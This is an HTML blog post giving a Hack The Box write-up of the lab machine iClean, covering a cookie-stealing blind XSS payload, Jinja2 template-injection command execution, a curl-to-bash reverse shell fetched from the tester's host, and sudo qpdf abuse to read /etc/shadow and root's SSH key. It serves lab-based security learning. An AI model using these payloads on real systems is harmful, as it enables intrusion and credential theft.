@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Joe Graham">
+    <meta name="description" content="Joe Graham&#39;s website and blog">
+    <meta name="keywords" content="blog,cybersecurity,infosec,pentest,offsec">
+
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Hack The Box Write-up: iClean"/>
+<meta name="twitter:description" content="A write-up of my experience completing the Hack The Box system iClean."/>
+
+    <meta property="og:title" content="Hack The Box Write-up: iClean" />
+<meta property="og:description" content="A write-up of my experience completing the Hack The Box system iClean." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/iclean/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-04-15T09:05:17-04:00" />
+<meta property="article:modified_time" content="2024-04-15T09:05:17-04:00" />
+
+
+    
+      <base href="http://localhost:1313/posts/iclean/">
+    
+    <title>
+  Hack The Box Write-up: iClean · Joe Graham
+</title>
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/iclean/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="http://localhost:1313/css/coder.css" media="screen">
+    
+
+    
+
+    
+
+    
+      <link rel="stylesheet" href="http://localhost:1313/lightbox/lightbox.css" />
+    
+
+    
+    
+    <link rel="icon" type="image/png" href="http://localhost:1313/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="http://localhost:1313/images/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.124.1">
+  </head>
+
+  <body class=" ">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="http://localhost:1313/">
+      Joe Graham
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="http://localhost:1313/posts/">Blog</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="http://localhost:1313/about">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Hack The Box Write-up: iClean</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2024-04-15T09:05:17-04:00'>
+                April 15, 2024
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              6 minutes read
+            </span>
+          </div>
+          
+          <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="http://localhost:1313/tags/hack-the-box/">Hack the Box</a>
+      <span class="separator">•</span>
+    <a href="http://localhost:1313/tags/pentesting/">pentesting</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        <p>iClean is a Linux box created by LazyTitan33 that is rated medium by the HTB community. iClean&rsquo;s exploit
+process involves exploiting a web application vulnerable to blind cross-site scripting (XSS), server-side template
+injection (SSTI), and then privilege escalation via an arbitrary write as root vulnerability in the sudo configuration.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>As usual, we start by enumerating the open ports and services on the system.</p>
+<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Mon Apr 15 12:07:52 2024 as: nmap -p- -sV -oA 10.10.11.12 -v 10.10.11.12
+Nmap scan report for capiclean.htb (10.10.11.12)
+Host is up (0.027s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Apr 15 12:07:59 2024 -- 1 IP address (1 host up) scanned in 7.04 seconds
+</code></pre><h1 id="http">HTTP</h1>
+<p>The only usable listening service at our disposal is HTTP. Browsing to the index page of the site
+reveals this page:</p>
+<p><img src="http://localhost:1313/posts/iclean/index_page.png" alt="index page, blue page with &ldquo;iClean - Keep your house clean&rdquo;"></p>
+<p>The menu bar in the top right of the page lists 5 menu options, as shown below.</p>
+<p><img src="http://localhost:1313/posts/iclean/menu.png" alt="Five options: Home, Services, About, Choose, Team"></p>
+<p>I browsed through each page to enumerate the application&rsquo;s functionality, and found a page to obtain a quote for services at <code>http://capiclean.htb/quote</code>. The page is shown below.</p>
+<p><img src="http://localhost:1313/posts/iclean/quote_page.png" alt="A page with three checkboxes - Carpet Cleaning, Tile &amp; Grout, Office Cleaning, and an input field for an email address"></p>
+<h2 id="blind-xss">Blind XSS</h2>
+<p>I found that the email address field was vulnerable to Blind XSS. I discovered the vulnerability when I sent a crafted request for carpet cleaning. A normal quote generated an HTTP POST request to <code>http://capiclean.htb/sendMessage</code>  proxied by Burp Suite is shown below.
+<img src="http://localhost:1313/posts/iclean/normal_quote_request.png" alt="an HTTP POST request to the endpoint with these parameters: service=Carpet+Cleaning&amp;email=test%40capiclean.htb"></p>
+<p>I chose a payload that would send the victim&rsquo;s cookies to a Netcat listener on port 1337. The payload and the URL encoded version of the payload is shown below in the Decoder component in Burp Suite.</p>
+<p><img src="http://localhost:1313/posts/iclean/xss_payload.png" alt="JavaScript payload: &lt;img src=x onerror=this.src=&ldquo;http://10.10.14.225:1337/&quot;+btoa(document.cookie)&gt;"></p>
+<p>I saved the cookie in Cookie Manager and browsed to <code>/dashboard</code>, which allowed me access to the application&rsquo;s admin panel.</p>
+<p><img src="http://localhost:1313/posts/iclean/admin_panel.png" alt="Admin Dashboard - page with &ldquo;Generate Invoice&rdquo;, &ldquo;Generate QR&rdquo;, &ldquo;Edit Services&rdquo;, and &ldquo;Quote Requests&rdquo; buttons"></p>
+<h2 id="server-side-template-injection-ssti">Server-Side Template Injection (SSTI)</h2>
+<p>I browsed to each of the new pages and found the QR generation page accepted an invoice number generated by the &ldquo;Generate Invoice&rdquo; page.
+<img src="http://localhost:1313/posts/iclean/generate_invoice.png" alt="Page with the following text: &ldquo;Invoice ID generated: 672097015&rdquo;. The ID is cut off by the end of the screen.">
+<img src="http://localhost:1313/posts/iclean/generate_qr.png" alt="Page with a text field for an invoice ID, and the invoice ID from the last screenshot entered into it"></p>
+<p>The next page allowed the user to enter a link to a QR code that would be added to an invoice generated by the page.
+<img src="http://localhost:1313/posts/iclean/qr_link.png" alt="Page with the same field as above, as well as a field saying &ldquo;Insert QR link to generate scannable invoice&rdquo;."></p>
+<p>An invoice generated with &ldquo;test&rdquo; for the link is shown below.
+<img src="http://localhost:1313/posts/iclean/invoice.png" alt="Invoice for the quoted service"></p>
+<p>The QR-link field can be leveraged to inject arbitrary data in the Jinja2 Python templating engine used by the web application. I identified that the website was using Flask by noticing the Server header in each response returned by the application. <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti">HackTricks</a> includes a primer on different payloads for testing injection as well as how to leverage injection to obtain arbitrary read/write and RCE via the templating engine.</p>
+<p>I demonstrated this vulnerability first by injecting <code>{{config.items()}}</code> into the QR link field.</p>
+<p><img src="http://localhost:1313/posts/iclean/config_items.png" alt="Request with the qr-link field set as described, and a response showing a number of configuration items set by the Jinja2 templating engine"></p>
+<p>While testing several payloads, I found that certain characters caused the application to return an HTTP 500 response. For example, requests with <code>_</code> in the field returned an HTTP 500.
+<img src="http://localhost:1313/posts/iclean/ssti_1.png" alt="Request with `{{[].class}} in the qr_link parameter"></p>
+<p>Encoding the payload with the format <code>\x + hex_code</code> allowed the request to go through. The root directory on the webserver was displayed in place of the QR code URL.</p>
+<p><img src="http://localhost:1313/posts/iclean/ssti_2.png" alt="Request with the following qr link: {{&rdquo;&quot;[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1]&quot;\x5f\x5fsubclasses\x5f\x5f&quot;[365](&rsquo;ls /&rsquo;,shell=True,stdout=-1).communicate()}}"></p>
+<p>I then crafted an RCE payload following the steps given in the HackTricks writeup. The request and response in Burp Suite Repeater is shown below.</p>
+<p><img src="http://localhost:1313/posts/iclean/ssti_3.png" alt="Same payload as above except instead of ls /, the command is `curl http://10.10.14.225:1337"></p>
+<p>A Netcat listener open on 1337 successfully received the HTTP request generated by the curl command.
+<img src="http://localhost:1313/posts/iclean/ssti_curl_request.png" alt="A terminal window with the command nc -lvp 1337 and an incoming HTTP GET request for / with the curl user agent."></p>
+<p>I wrote a bash reverse shell that would connect back to port 1337, which is shown here. I placed it in <code>/var/www/html</code> and then started the Apache webserver on my Kali VM.
+<img src="http://localhost:1313/posts/iclean/ssti_bash_payload.png" alt=""></p>
+<p>I triggered another command to request the payload and pass the payload to a new bash process, as shown below.
+<img src="ssti_execute_reverse_shell.png" alt="Burp Repeater request and response with the RCE payload curl http://10.10.14.225/exploit.sh|bash"></p>
+<p>A reverse shell was spawned and connected to the netcat listener.
+<img src="http://localhost:1313/posts/iclean/reverse_shell.png" alt="A reverse shell as www-data on the iclean box."></p>
+<h1 id="user-own">User own</h1>
+<p>While this is a step in the right direction, the www-data user doesn&rsquo;t have a lot of access on the system. The user is able to look at all files within <code>/opt/app</code>, which includes the <code>app.py</code> file used to serve the web application. At the top of the file there were credentials to connect to a MySQL database used to store records used by the web application.</p>
+<p><img src="http://localhost:1313/posts/iclean/app_py.png" alt="The top of the application source code, including the database creds"></p>
+<p>It would be unwieldy to try to use the MySQL client over a reverse shell, so I used <a href="https://github.com/jpillora/chisel">Chisel</a> to forward the MySQL port on the iclean box to my Kali VM. The command I used to forward the port is shown below.
+<img src="http://localhost:1313/posts/iclean/chisel_port_forward.png" alt="Command: chisel client 10.10.14.225:4444 R:3306:localhost:3306"></p>
+<p>I was then able to connect to the iclean box&rsquo;s MySQL server using the MySQL client on my Kali box.
+<img src="http://localhost:1313/posts/iclean/mysql_client.png" alt="MySQL client connected as the iclean user"></p>
+<p>I enumerated the database and found a users table in the capiclean database, which included the admin user as well as a user named <code>consuela</code> in the application.
+<img src="http://localhost:1313/posts/iclean/mysql_user_and_hashes.png" alt="Explained above"></p>
+<p>I entered both hashes into CrackStation, and the password hash for <code>consuela</code> was successfully cracked.</p>
+<p><img src="http://localhost:1313/posts/iclean/crackstation.png" alt="The password for consuela is &ldquo;simple and clean&rdquo;."></p>
+<p>Using this information, I was able to login as consuela over SSH to the box and obtain the user flag.
+<img src="http://localhost:1313/posts/iclean/consuela_ssh.png" alt="ssh consuela@capiclean.htb"></p>
+<h2 id="enumeration-1">Enumeration</h2>
+<p>After getting access to the consuela user, I began enumerating information about the box. Out of habit I usually
+run the <code>sudo -l</code> command at the start of any user enum on *nix systems since it&rsquo;s easy to misconfigure <code>sudo</code> in a
+way that allows privilege escalation to root. As luck would have it, the user does have access to running a command
+as sudo, as shown below.</p>
+<p><img src="http://localhost:1313/posts/iclean/sudo.png" alt="sudo -l showing user may run /usr/bin/qpdf as root"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p><code>qpdf</code> is <a href="https://github.com/qpdf/qpdf">a content-preserving PDF document transformer</a>. We don&rsquo;t need to know much of how the utility works, other than that it can read and write to any files that are owned by the user the program is running as.</p>
+<p><code>qpdf</code> has three command parameters that can be utilized to attach, list, and display attachments to a pdf file. They are:</p>
+<ul>
+<li><code>--add-attachment</code></li>
+<li><code>--list-attachment</code></li>
+<li><code>--show-attachments</code></li>
+</ul>
+<p>The functions are self-explanatory. At first I used the command to obtain the <code>/etc/shadow</code> file by adding it as an attachment to a sample PDF that was accessible as the <code>consuela</code> user, as shown below.
+<img src="http://localhost:1313/posts/iclean/shadow_attachment.png" alt="Command line: sudo /usr/bin/qpdf --add-attachment /etc/shadow -- test-file.pdf"></p>
+<p>However, the root password was not able to be cracked using CrackStation or John the Ripper and hashcat. Instead of spending more time trying to crack the hash, I instead tried to obtain a private key from <code>/root/.ssh/id_rsa</code>, which is shown below.
+<img src="http://localhost:1313/posts/iclean/root_ssh_key.png" alt="Command line: sudo /usr/bin/qpdf --add-attachment /root/.ssh/id_rsa -- test-file.pdf"></p>
+<p>I then attempted to login as root via SSH, which was successful, as shown below.
+<img src="http://localhost:1313/posts/iclean/root_pwn.png" alt="Successful login as root to capiclean.htb"></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This was a fun and creative box, pretty solidly tailored towards my areas of expertise: web application security and Linux privelege escalation. Thank you to LazyTitan53 for creating this box!</p>
+
+      </div>
+
+      <footer>
+        
+
+
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+     © 2024
+    
+       · 
+      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+
+  </body>
+
+</html>
